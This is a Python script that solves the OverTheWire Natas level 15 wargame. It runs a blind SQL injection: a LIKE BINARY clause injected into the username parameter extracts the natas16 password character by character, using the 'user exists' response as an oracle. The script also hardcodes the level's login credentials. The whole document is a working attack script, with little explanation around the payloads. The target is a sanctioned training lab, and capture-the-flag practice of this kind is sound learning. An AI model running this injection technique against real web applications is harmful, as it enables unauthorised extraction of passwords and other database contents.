#!/bin/python
import requests,string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password_dictionary = ['',]
exists_str = "This user exists."
for char in characters:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(auth_username,auth_password))
    print(r)
    if exists_str in r.text:
        password_dictionary.append(char)
        print(f"Password Dictionary: {''.join(password_dictionary)}")
print("Dictionary build complete.")
print(f"Dictionary: {''.join(password_dictionary)}")

# Given the dictionary of characters we just built, we'll try each character in that list
print("Now attempting to brute force...")
password_list = ["",]
password = ''
for i in range(1,64):
    for char in password_dictionary:
        test = ''.join([password,char])
        # Build the GET Request
        uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%','&debug'])
        # Send the HTTP GET request to the server
        r = requests.get(uri, auth=(auth_username,auth_password))
        # Parse the HTTP response
        if exists_str in r.text:
            password_list.append(char)
            password = ''.join(password_list)
            print(f"Length: {len(password)}, Password: {password}")